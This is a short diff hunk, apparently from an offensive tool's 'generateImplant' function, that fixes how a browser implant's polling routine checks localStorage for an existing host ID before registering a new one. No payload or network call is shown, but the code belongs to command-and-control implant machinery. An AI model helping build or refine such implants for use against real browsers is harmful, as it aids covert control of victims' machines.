@@ -68,7 +68,7 @@ async function generateImplant(req, res) {
     }
     
     async function poll() {
-        if(localStorage.getItem("${hostCookie}") == null || localStorage.getItem("${hostCookie}") == undefined) {
+        if(localStorage.getItem("${hostCookie}") == null || localStorage.getItem("${hostCookie}") == undefined || localStorage.getItem("${hostCookie}") == "undefined") {
             createHID();
         } else {
             id = localStorage.getItem("${hostCookie}");
